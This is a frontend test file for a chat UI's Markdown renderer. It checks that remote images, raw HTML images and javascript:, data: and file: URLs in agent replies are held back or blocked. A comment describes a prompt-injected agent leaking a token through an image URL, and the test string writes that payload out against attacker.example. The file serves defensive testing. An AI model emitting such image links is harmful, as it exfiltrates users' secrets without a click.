import { cleanup, fireEvent, render, screen, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { Markdown } from "@/components/thread/markdown";
import { imageSource } from "@/lib/markdown-images";

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

// Issue #317: a prompt-injected agent ends its reply with an image whose URL carries data.
const exfil = "Done.\n\n![](https://attacker.example/?d=SECRET_TOKEN)";
const origin = window.location.origin;

/** Every element in the container that would make the browser fetch a remote URL. */
function remoteFetches(container: HTMLElement): string[] {
  return [...container.querySelectorAll("img, source, picture, video, audio")]
    .map((el) => el.getAttribute("src") ?? el.getAttribute("srcset") ?? "")
    .filter((src) => /^(https?:)?\/\//i.test(src) && !src.startsWith(origin));
}

describe("Markdown: remote images (#317)", () => {
  it("does not load a remote image in an agent reply until the user asks", async () => {
    const fetch = vi.spyOn(globalThis, "fetch");
    const { container } = render(<Markdown>{exfil}</Markdown>);
    await screen.findByText("Done.");
    // The browser fetches an <img src> as soon as it is in the DOM: zero-click exfiltration.
    expect(remoteFetches(container)).toEqual([]);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("attacker.example");
    expect(fetch).not.toHaveBeenCalled();

    fireEvent.click(screen.getByRole("button", { name: "Load image from attacker.example" }));
    const img = container.querySelector("img");
    // Loaded through CodeDen's server, the only image source the UI's CSP allows.
    const url = new URL(img?.getAttribute("src") ?? "", origin);
    expect(url.origin).toBe(origin);
    expect(url.pathname).toBe("/api/remote-image");
    expect(url.searchParams.get("url")).toBe("https://attacker.example/?d=SECRET_TOKEN");
    expect(remoteFetches(container)).toEqual([]);
  });

  it("holds back raw HTML images and picture sources too", async () => {
    const html = [
      "Look:",
      "",
      '<img src="https://raw.example/x.png" srcset="https://srcset.example/x.png 2x">',
      "",
      '<picture><source srcset="https://pic.example/a.png"><img src="https://pic.example/b.png"></picture>',
    ].join("\n");
    const { container } = render(<Markdown>{html}</Markdown>);
    await screen.findByText("Look:");
    expect(remoteFetches(container)).toEqual([]);
    expect(container.querySelector("source, img")).toBeNull();
    expect(screen.getAllByRole("button", { name: /^Load image from / })).toHaveLength(2);
  });

  it("shows inline images and CodeDen's own artifacts at once", async () => {
    const png = "data:image/png;base64,iVBORw0KGgo=";
    const md = `Here: ![chart](${png}) ![shot](${origin}/api/artifacts/a1)`;
    const { container } = render(<Markdown>{md}</Markdown>);
    await screen.findByText(/Here:/);
    const srcs = [...container.querySelectorAll("img")].map((i) => i.getAttribute("src"));
    expect(srcs).toEqual([png, `${origin}/api/artifacts/a1`]);
    expect(screen.queryByRole("button", { name: /Load image/ })).toBeNull();
  });

  it("refuses javascript: and data: links and confirms others before opening", async () => {
    const md = "[a](javascript:alert(1)) [b](data:text/html,<b>x</b>) [c](https://example.com/c)";
    const { container } = render(<Markdown>{md}</Markdown>);
    const link = await screen.findByRole("button", { name: "c" });
    expect(container.querySelector('[href^="javascript:"], [href^="data:"]')).toBeNull();
    expect(container.textContent).toContain("[blocked]");
    const open = vi.spyOn(window, "open").mockReturnValue(null);
    fireEvent.click(link);
    expect(open).not.toHaveBeenCalled();
    const dialog = await screen.findByRole("dialog", { name: "Open this link?" });
    expect(dialog.textContent).toContain("https://example.com/c");
    fireEvent.click(within(dialog).getByRole("button", { name: "Open link" }));
    expect(open).toHaveBeenCalledWith("https://example.com/c", "_blank", "noreferrer");
  });
});

describe("imageSource (#317)", () => {
  const origins = ["http://127.0.0.1:4317"];
  it("loads only inline images and stored artifacts by themselves", () => {
    for (const src of [
      "data:image/png;base64,AAAA",
      "blob:http://127.0.0.1:4317/0b1c",
      "streamdown:incomplete-image",
      "http://127.0.0.1:4317/api/artifacts/a1",
    ]) {
      expect(imageSource(src, origins), src).toEqual({ kind: "local" });
    }
  });

  it("holds back other hosts and names the real one behind CodeDen's image fetch", () => {
    expect(imageSource("https://Attacker.example:8443/x?d=1", origins)).toEqual({
      kind: "remote",
      url: "https://attacker.example:8443/x?d=1",
      host: "attacker.example:8443",
    });
    const wrapped = `http://127.0.0.1:4317/api/remote-image?url=${encodeURIComponent("https://evil.example/p")}`;
    expect(imageSource(wrapped, origins)).toMatchObject({ kind: "remote", host: "evil.example" });
    expect(imageSource("//cdn.example/x.png", origins)).toEqual({ kind: "blocked" });
  });

  it("never loads other schemes or other CodeDen URLs", () => {
    for (const src of [
      undefined,
      "javascript:alert(1)",
      "file:///etc/passwd",
      "data:text/html,<b>x</b>",
      "http://127.0.0.1:4317/api/sessions/s1/snapshot",
      "http://127.0.0.1:4317/api/artifacts/a1?download=1",
      "/api/artifacts/a1",
    ]) {
      expect(imageSource(src, origins), String(src)).toEqual({ kind: "blocked" });
    }
  });
});
